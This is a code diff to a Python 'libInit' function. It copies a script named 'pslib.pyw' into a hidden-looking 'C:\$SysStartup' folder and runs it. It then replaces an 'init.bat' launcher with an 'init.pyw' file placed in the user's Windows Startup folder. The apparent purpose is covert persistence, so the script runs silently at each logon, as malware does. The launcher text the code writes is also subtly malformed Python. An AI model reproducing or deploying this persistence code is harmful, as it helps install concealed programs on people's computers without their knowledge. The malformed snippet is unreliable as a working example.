@@ -87,19 +87,17 @@ def libInit():
             lib.write(var)
 
         call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
-        # call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
-        call(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat", shell=True)
+        call(["python", "C:\\$SysStartup\\pslib.pyw"], shell=True)
 
     if not exists(
             f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$SysStartup\\pslib.pyw"):
 
-        if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat"):
-            with open("init.bat", "w") as bat:
-                bat.write("python \"C:\$SysStartup\pslib.pyw\"")
+        if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"):
+            with open("init.pyw", "w") as bat:
+                bat.write("from subprocess import call\n call(['python', \"C:\$SysStartup\pslib.pyw\"]")
 
         sleep(0.5)
-        call(["move", "init.bat",
-              f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)
+        call(["move", "init.pyw", f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)
 
         if not exists("C:\\$SysStartup\\pslib.pyw"):
             libLoad()
